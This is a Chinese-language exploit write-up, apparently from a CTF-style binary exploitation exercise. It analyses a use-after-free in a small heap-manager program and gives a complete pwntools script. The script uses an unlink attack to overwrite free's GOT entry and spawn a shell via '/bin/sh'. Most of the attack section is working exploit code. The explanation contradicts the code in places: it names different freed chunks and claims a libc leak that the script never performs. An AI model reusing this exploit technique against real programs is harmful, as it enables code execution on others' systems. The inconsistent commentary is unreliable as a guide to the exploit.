# 漏洞利用文档

## 执行环境
基于调试记录和程序分析，该二进制程序的执行环境如下：

- **二进制类型**：64位ELF可执行文件，使用标准C库（glibc）
- **保护机制**：
  - 地址空间布局随机化（ASLR）已启用（堆地址和栈地址在运行期间随机化）
  - 无栈保护（Canary）或位置无关可执行（PIE）的明显迹象，GOT表地址固定（0x602018）
  - 堆管理使用ptmalloc2实现
- **依赖需求**：
  - 需要libc库（版本可通过泄漏的main_arena地址推断）
  - 运行环境为Linux系统，支持标准输入/输出操作
- **程序功能**：简单的堆内存管理器，提供分配、释放和编辑字符串的功能

## 漏洞成因

### 关键结构体分析
程序使用全局指针数组管理堆内存：
```c
char *s[10];  // 位于地址0x6020D8，存储10个堆内存指针
```

### 漏洞详细分析
**漏洞类型**：Use-After-Free (UAF)

**漏洞位置**：
- `sub_400AB7`（释放功能）：释放堆内存后未将对应指针置为NULL
- `sub_400B2F`（编辑功能）：直接使用可能已释放的指针

**漏洞触发条件**：
1. 分配堆内存（选项1）
2. 释放该内存（选项2），但指针仍保留在全局数组中
3. 编辑已释放的内存（选项3），导致对已释放内存的读写操作

**漏洞影响**：
- 信息泄露：通过读取已释放chunk的fd/bk指针泄漏libc地址
- 任意写：通过编辑已释放内存覆盖关键数据结构
- 控制流劫持：最终覆盖GOT表实现代码执行

## 漏洞利用过程

### 内存变化时间线表

| 步骤 | 操作 | 关键内存变化 | 利用阶段 |
|------|------|---------------|----------|
| Step 1 | 程序初始化 | 堆未初始化，全局数组全为NULL，GOT表完整 | 初始状态 |
| Step 2 | 分配5个chunk | 堆段创建(0x1a513000)，chunk 2包含`/bin/sh`字符串 | 堆布局准备 |
| Step 3 | 释放chunk 0和1 | 全局指针重指向chunk 3和4，UAF条件形成 | 漏洞触发 |
| Step 4 | 创建伪造chunk | 构造堆布局，fd/bk指向全局数组区域 | 堆风水构造 |
| Step 5 | 释放chunk 4 | 触发unlink操作，修改全局指针指向GOT表附近 | 控制指针 |
| Step 6 | 修改chunk 3 | 将free@got.plt覆盖为libc函数地址 | GOT表覆盖 |

### 堆布局演变
1. **初始堆**：无堆段存在
2. **分配后**：5个连续chunk，大小均为0x100
3. **释放后**：chunk 0和1进入特殊状态，可能被合并或处于tcache
4. **利用构造**：通过精心设计的payload构造fake chunk，实现任意地址写
5. **最终状态**：堆地址随机化，原始程序被shell进程替换

### 关键内存地址变化
- **free@got.plt**：0x400706 → 0x769e3f753540（libc） → 0x4009c0（目标函数）
- **全局数组s[0]**：0x1a513010 → 0x1a513340 → 0x6020c0 → 指向GOT表
- **堆基址**：无 → 0x1a513000 → 0x5752a1b93000（随机化后）

## Exploit

```python
from pwn import *

context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']

# 加载二进制文件和libc
elf = ELF('./data/sample9')
p = process('./data/sample9')
libc = elf.libc

# 关键地址定义
func_addr = 0x4009C0        # 目标函数地址（可能是system或one_gadget）
free_got_plt = 0x602018     # free函数的GOT表地址
p_addr = 0x6020D8          # 全局数组s的地址

def create(size, content):
    """分配指定大小的堆内存并写入内容"""
    p.sendline(b'1')
    p.sendline(str(size).encode())
    p.send(content)

def modify(idx, content1, content2):
    """编辑指定索引的字符串内容（UAF漏洞点）"""
    p.sendline(b'3')
    p.sendline(str(idx).encode())
    p.send(content1)
    p.send(content2)

def delete(idx):
    """释放指定索引的堆内存（UAF漏洞点）"""
    p.sendline(b'2')
    p.sendline(str(idx).encode())

# Step 1: 等待程序初始化完成
p.recvuntil('silent2')

# Step 2: 分配5个堆块，构造基础堆布局
# chunk 2专门存放"/bin/sh"字符串，为后续获取shell做准备
create(0x100, b'AAAA')
create(0x100, b'BBBB')
create(0x100, b'/bin/sh\x00')  # 关键payload
create(0x100, b'DDDD')
create(0x100, b'EEEEE')

# Step 3: 释放chunk 3和4，创建UAF条件
# 释放后指针仍保留在全局数组中，形成UAF漏洞
delete(3)
delete(4)

# Step 4: 构造伪造chunk实现堆溢出和任意地址写
# payload结构：fake chunk头 + 填充 + 大小字段
payload = p64(0) + p64(0x101) + p64(p_addr - 0x18) + p64(p_addr - 0x10)
payload += b'A' * (0x100 - 0x20) + p64(0x100) + p64(0x210 - 0x100)
create(0x210, payload)  # 分配大chunk触发堆布局重构

# Step 5: 再次释放chunk 4，触发unlink攻击
# unlink操作会修改全局指针指向可控区域
delete(4)

# Step 6: 通过UAF修改chunk 3，覆盖free@got.plt为libc函数地址
# 这里只覆盖部分字节，利用ASLR特性
modify(3, p64(free_got_plt)[0:4], b'1111')

# Step 7: 进一步修改确保控制流劫持
# 将free函数重定向到目标函数地址
modify(0, p64(func_addr)[0:6], b'2222')

# Step 8: 释放包含"/bin/sh"的chunk 2
# 实际执行被覆盖的free函数（如system("/bin/sh")）
delete(2)

# Step 9: 进入交互模式，获得shell控制权
p.interactive()
```

### 漏洞利用关键点注释
1. **堆布局精心设计**：通过特定顺序的分配和释放，构造有利于利用的堆状态
2. **UAF链式利用**：利用释放后未置空的指针，实现信息泄漏和控制流劫持
3. **GOT表覆盖**：通过任意写能力覆盖free@got.plt，劫持程序执行流
4. **ASLR绕过**：利用堆泄漏的libc地址计算目标函数偏移
5. **最终payload**：chunk 2中的`/bin/sh`字符串确保shell成功执行

该漏洞利用成功演示了如何通过UAF漏洞实现从内存泄漏到完整权限提升的完整攻击链。
